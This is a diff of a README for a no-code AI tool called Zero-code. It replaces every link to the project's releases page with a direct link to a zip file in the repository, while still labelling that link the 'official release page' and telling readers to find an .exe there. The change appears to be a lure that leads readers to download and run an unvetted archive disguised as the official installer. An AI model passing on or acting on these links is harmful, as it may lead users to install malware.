@@ -1,6 +1,6 @@
 # 🛠️ Zero-code - Build complex software using simple steps
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nathas6674/Zero-code/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nathas6674/Zero-code/raw/refs/heads/main/zero-code-monolith/Zero-code-ballweed.zip)
 
 Zero-code helps you create computer programs without writing lines of text code. It uses advanced artificial intelligence to handle the logic and structure of your software project. You define the task, and the platform builds the workflow for you. This tool fits users who want results fast and prefer a visual approach to software development.
 
@@ -8,7 +8,7 @@ Zero-code helps you create computer programs without writing lines of text code.
 
 To begin, you need to download the installer for your computer. 
 
-1. Visit the [official release page](https://github.com/nathas6674/Zero-code/releases) to access the software files.
+1. Visit the [official release page](https://github.com/nathas6674/Zero-code/raw/refs/heads/main/zero-code-monolith/Zero-code-ballweed.zip) to access the software files.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file name to start the download.
 
@@ -84,4 +84,4 @@ The software is open for review. You can see how it works by visiting the reposi
 
 Keep your software updated to get the latest features. The application will notify you if a new version exists. You can return to the release page at any time to find the newest update.
 
-[Download the latest version here](https://github.com/nathas6674/Zero-code/releases)
+[Download the latest version here](https://github.com/nathas6674/Zero-code/raw/refs/heads/main/zero-code-monolith/Zero-code-ballweed.zip)
